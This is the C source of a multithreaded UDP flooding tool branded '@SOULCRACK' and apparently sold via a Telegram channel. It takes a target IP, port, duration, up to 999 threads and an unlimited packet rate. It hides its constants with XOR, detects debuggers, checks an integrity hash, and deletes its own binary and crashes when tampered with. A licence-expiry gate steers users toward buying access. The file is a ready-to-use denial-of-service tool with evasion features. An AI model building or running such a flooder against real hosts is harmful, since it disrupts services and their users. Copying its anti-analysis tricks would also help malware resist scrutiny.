#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <pthread.h>


#define SHA_LEN 32
#define BUFFER_SIZE 8000
#define MAX_THREADS 999

#define UDP_PAYLOAD "UDP traffic test"
#define UDP_PAYLOAD_LEN 16
#define MAX_PACKET_SIZE 1400  // Maximum size for UDP packet payload (approximate safe MTU)

#define XOR_SECRET1 0xA5E1
#define XOR_SECRET2 0xC37A

static const int encoded_expected_return    = 1337 ^ XOR_SECRET1;
static const int encoded_error_exit_code    = 1971 ^ XOR_SECRET2;
static const int encoded_expiry_year        = 2025 ^ XOR_SECRET1;
static const int encoded_expiry_month       = 9   ^ XOR_SECRET2;
static const int encoded_expiry_day         = 13   ^ XOR_SECRET1;

int get_expected_return()     { return encoded_expected_return ^ XOR_SECRET1; }
int get_error_exit_code()     { return encoded_error_exit_code ^ XOR_SECRET2; }
int get_expiry_year()         { return encoded_expiry_year ^ XOR_SECRET1; }
int get_expiry_month()        { return encoded_expiry_month ^ XOR_SECRET2; }
int get_expiry_day()          { return encoded_expiry_day ^ XOR_SECRET1; }

static const char* protected_error =
    "Error: This file is closed @SOULCRACK\n"
    "This version has expired as of 2025-01-13.\n"
    "To continue using the full features, please acquire a valid license.\n"
    "Visit our Telegram channel @SOULCRACK to purchase or get support.\n"
    "Thank you for your understanding.\n";

static const char* protected_watermark =
    "@telegram channel @SOULCARCK\n"
    "Terms of service use and legal considerations apply.\n";

static const char* protected_usage =
    "Usage: <IP> <PORT> <DURATION_SECONDS> <THREADS> <PPS>\n"
    "- IP: Target IP address\n"
    "- PORT: Target port number\n"
    "- DURATION_SECONDS: Duration to send packets\n"
    "- THREADS: Number of concurrent sending threads (1-999)\n"
    "- PPS: Packets per second (-1 for unlimited speed)\n"
    "Example:\n"
    "./soul 192.168.1.100 80 60 4 -1\n";

//static const unsigned char hardcoded_hash[SHA_LEN] = {
 //   0x35, 0x28, 0x33, 0x7c, 0x36, 0x04, 0x95, 0x92,
//    0x7d, 0x37, 0x34, 0xfe, 0xbc, 0x5f, 0xbd, 0x71,
 //   0x37, 0x83, 0x74, 0x88, 0x30, 0xa1, 0xd2, 0x45,
//    0x09, 0xda, 0x66, 0xf7, 0xba, 0x2c, 0x1a, 0xca
//};
static const unsigned char hardcoded_hash[SHA_LEN] = {
0x5f, 0xb4, 0x73, 0x41, 0x55, 0xef, 0xcd, 0xc3, 0x88, 0x52, 0x62, 0xc5, 0xcd, 0x1c, 0xe3, 0x4e, 0x38, 0x25, 0x61, 0xf2, 0x04, 0x7b, 0x30, 0xff, 0x30, 0xf9, 0x05, 0x31, 0xfd, 0xb8, 0xd8, 0x90
};

void get_runtime_salt(unsigned char *salt, size_t len) {
    char exe_path[PATH_MAX];
    ssize_t path_len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (path_len != -1) {
        exe_path[path_len] = '\0';
        int fd = open(exe_path, O_RDONLY);
        if (fd != -1) {
            ssize_t readlen = read(fd, salt, len);
            if (readlen != (ssize_t)len) { memset(salt, 0xab, len); }
            close(fd);
        } else {
            memset(salt, 0xcd, len);
        }
    } else {
        memset(salt, 0xef, len);
    }
}

void print_current_integrity_hash_and_salt_debug() {
    unsigned char salt[SHA_LEN];
    get_runtime_salt(salt, SHA_LEN);

    printf("[DEBUG] Real-time salt from binary contents:\n");
    for (unsigned int i = 0; i < SHA_LEN; i++)
        printf("0x%02x, ", salt[i]);
    printf("\n");

    int real_expected_return = get_expected_return();
    int real_error_exit_code = get_error_exit_code();
    int real_expiry_year  = get_expiry_year();
    int real_expiry_month = get_expiry_month();
    int real_expiry_day   = get_expiry_day();

    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;

    EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL);
    EVP_DigestUpdate(mdctx, salt, SHA_LEN);
    EVP_DigestUpdate(mdctx, &real_expected_return, sizeof(real_expected_return));
    EVP_DigestUpdate(mdctx, &real_error_exit_code, sizeof(real_error_exit_code));
    EVP_DigestUpdate(mdctx, &real_expiry_year, sizeof(real_expiry_year));
    EVP_DigestUpdate(mdctx, &real_expiry_month, sizeof(real_expiry_month));
    EVP_DigestUpdate(mdctx, &real_expiry_day, sizeof(real_expiry_day));
    EVP_DigestUpdate(mdctx, protected_error, strlen(protected_error));
    EVP_DigestUpdate(mdctx, protected_watermark, strlen(protected_watermark));
    EVP_DigestUpdate(mdctx, protected_usage, strlen(protected_usage));
    EVP_DigestFinal_ex(mdctx, hash, &hash_len);
    EVP_MD_CTX_free(mdctx);

    printf("[DEBUG] Current SHA-256 hash for your values:\n");
    for (unsigned int i = 0; i < hash_len; i++)
        printf("0x%02x, ", hash[i]);
    printf("\n");
}

static void verify_integrity_or_self_destruct() {
    unsigned char salt[SHA_LEN];
    get_runtime_salt(salt, SHA_LEN);

    int real_expected_return = get_expected_return();
    int real_error_exit_code = get_error_exit_code();
    int real_expiry_year  = get_expiry_year();
    int real_expiry_month = get_expiry_month();
    int real_expiry_day   = get_expiry_day();

    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;

    EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL);
    EVP_DigestUpdate(mdctx, salt, SHA_LEN);
    EVP_DigestUpdate(mdctx, &real_expected_return, sizeof(real_expected_return));
    EVP_DigestUpdate(mdctx, &real_error_exit_code, sizeof(real_error_exit_code));
    EVP_DigestUpdate(mdctx, &real_expiry_year, sizeof(real_expiry_year));
    EVP_DigestUpdate(mdctx, &real_expiry_month, sizeof(real_expiry_month));
    EVP_DigestUpdate(mdctx, &real_expiry_day, sizeof(real_expiry_day));
    EVP_DigestUpdate(mdctx, protected_error, strlen(protected_error));
    EVP_DigestUpdate(mdctx, protected_watermark, strlen(protected_watermark));
    EVP_DigestUpdate(mdctx, protected_usage, strlen(protected_usage));
    EVP_DigestFinal_ex(mdctx, hash, &hash_len);
    EVP_MD_CTX_free(mdctx);

    int hashfail = hash_len != SHA_LEN || memcmp(hash, hardcoded_hash, SHA_LEN) != 0;

    if (hashfail) {
        fprintf(stderr, "Cracking System Active By @SOULCRACK.\n");
        do {
            char exe_path[PATH_MAX];
            ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
            if (len != -1) {
                exe_path[len] = '\0'; remove(exe_path);
                memset(exe_path, 0x00, sizeof(exe_path));
            }
        } while(0);
        volatile char *p = (char*)0xDEADBEEF; *p = 42;
        exit(get_error_exit_code());
    }
}

void anti_debug() {
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        fprintf(stderr, "[ANTIDEBUG] Debugger detected. Exiting.\n");
        do {
            char exe_path[PATH_MAX];
            ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
            if (len != -1) {
                exe_path[len] = '\0'; remove(exe_path);
            }
        } while(0);
        volatile char *p = (char*)0xFEEDBEEF; *p = 44;
        exit(get_error_exit_code());
    }
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
}

void print_usage(const char *progname) {
    fprintf(stderr, "%s%s", progname, protected_usage);
}

int is_expired() {
    struct tm exp = {0};
    exp.tm_year = get_expiry_year() - 1900;
    exp.tm_mon = get_expiry_month() - 1;  // Correct zero-based month here
    exp.tm_mday = get_expiry_day();
    time_t now = time(NULL);
    return difftime(mktime(&exp), now) < 0;
}

void print_telegram_link() {
    fprintf(stderr, "My channel link: https://t.me/SOULCRACK\n");
}

void print_watermark() {
    printf("==============================\n");
    printf("%s", protected_watermark);
    printf("==============================\n");
}

struct udp_params {
    char ip[INET_ADDRSTRLEN];
    int port;
    int duration;
    int pps; // packets per second (-1 for no limit)
};

// ----------- NORMAL UDP SENDER THREAD (RECEIVABLE BY NETCAT) ----------- //
void *udp_thread(void *arg) {
    struct udp_params *params = (struct udp_params*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(params->port);
    if (inet_pton(AF_INET, params->ip, &target_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    // High precision timer to prevent overshoot
    struct timespec start_time, current_time;
    clock_gettime(CLOCK_MONOTONIC, &start_time);
    double duration_sec = (double)params->duration;

    char buffer[MAX_PACKET_SIZE];
    int current_size = UDP_PAYLOAD_LEN;
    memcpy(buffer, UDP_PAYLOAD, UDP_PAYLOAD_LEN);

    useconds_t delay_us = 0;
    if (params->pps > 0)
        delay_us = 1000000 / params->pps;

    while(1) {
        clock_gettime(CLOCK_MONOTONIC, &current_time);
        double elapsed = (current_time.tv_sec - start_time.tv_sec) +
                         (current_time.tv_nsec - start_time.tv_nsec) / 1e9;
        if (elapsed >= duration_sec)
            break;

        int sent_bytes = sendto(sock, buffer, current_size, 0,
                                (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent_bytes <= 0) {
            perror("Send failed");
            break;
        }

        if (current_size + UDP_PAYLOAD_LEN <= MAX_PACKET_SIZE) {
            memcpy(buffer + current_size, UDP_PAYLOAD, UDP_PAYLOAD_LEN);
            current_size += UDP_PAYLOAD_LEN;
        } else {
            current_size = UDP_PAYLOAD_LEN;
            memcpy(buffer, UDP_PAYLOAD, UDP_PAYLOAD_LEN);
        }

        if (params->pps > 0)
            usleep(delay_us);
        // else pps == -1 means no delay - send as fast as possible
    }

    close(sock);
    pthread_exit(NULL);
}

void full_exit_check() {
    verify_integrity_or_self_destruct();
}

int main(int argc, char **argv) {
    print_current_integrity_hash_and_salt_debug(); // REMOVE IN PRODUCTION!

    anti_debug();
    verify_integrity_or_self_destruct();

    if (argc != 6) {
        print_usage(argv[0]);
        exit(get_error_exit_code());
    }

    if (is_expired()) {
        fprintf(stderr, "%s", protected_error);
        print_telegram_link();
        verify_integrity_or_self_destruct();
        exit(get_error_exit_code());
    }

    print_watermark();

    struct udp_params params;
    strncpy(params.ip, argv[1], INET_ADDRSTRLEN - 1);
    params.ip[INET_ADDRSTRLEN - 1] = '\0';
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    params.pps = atoi(argv[5]);

    if (threads < 1 || threads > MAX_THREADS) {
        fprintf(stderr, "Thread count must be 1-%d\n", MAX_THREADS);
        exit(get_error_exit_code());
    }

    if (params.pps < -1) {
        fprintf(stderr, "PPS must be -1 (no limit) or a positive number.\n");
        exit(get_error_exit_code());
    }

    pthread_t tid[MAX_THREADS];
    for (int i = 0; i < threads; ++i) {
        if (pthread_create(&tid[i], NULL, udp_thread, &params) != 0) {
            perror("Thread creation failed");
            exit(get_error_exit_code());
        }
    }
    for (int i = 0; i < threads; ++i)
        pthread_join(tid[i], NULL);

    printf("Flood finished.\n");
    full_exit_check();

    return get_expected_return();
}
